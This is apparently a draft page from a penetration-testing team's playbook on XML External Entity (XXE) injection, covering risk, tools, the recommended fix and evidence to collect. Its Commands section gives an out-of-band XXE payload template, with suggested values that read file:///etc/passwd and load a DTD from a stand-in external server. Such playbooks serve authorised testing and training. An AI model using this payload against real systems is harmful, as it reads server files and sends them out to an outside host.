*Draft: command steps not filled in yet.*

# 17. XML External Entity (XXE) Injection

- **Phase:** No credentials (any feature that accepts XML, including SAML logins)
- **Risk:** 🟡 Noisy: the client's server reads a file and connects out to us. The receiving server must be **our jump host**, never a server on the internet.
- **Tier:** Recognize
- **Finding:** none in the library yet
- **Ports:** 80, 443
- **Tools:** Burp Suite, listeners on the jump host
- **You need:** a request that sends XML (SAML logins often do, encoded)

## What it is
The server's XML parser follows "external entities": references inside the XML to files or URLs. An attacker can make it read local files or send requests, within what the web server account can reach.

In 2024 the XML sat inside a SAML login, so it had to be encoded before sending, and the file came back out-of-band (the server sent it to our listener).

**Fix to recommend:** turn off external entities in the parser (the OWASP XXE cheat sheet lists the setting for each parser).

## Commands
**Send XML data in payload** 

A fairly simple Payload, but base64 THEN url encoded so the server can read it:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % file SYSTEM
    "$PAYLOAD1$ ">
    <!ENTITY % dtd SYSTEM
    "$PAYLOAD2$ ">
    %dtd;
]>
<data>&send;</data>
```

usually $PAYLOAD1,2$ something like:
`http://my-external-server.com/rsl.dtd`
or 
`file:///etc/passwd`

## Evidence to capture
- `evidence/F-NNN-01.png`: the modified request.
- `evidence/F-NNN-02.png`: the file contents arriving at our listener.

## Practice
- PortSwigger Web Security Academy, XXE injection labs

---
*Adapted from the CCSF 2024 Web playbooks. Updated by the CCSF 2026 team.*
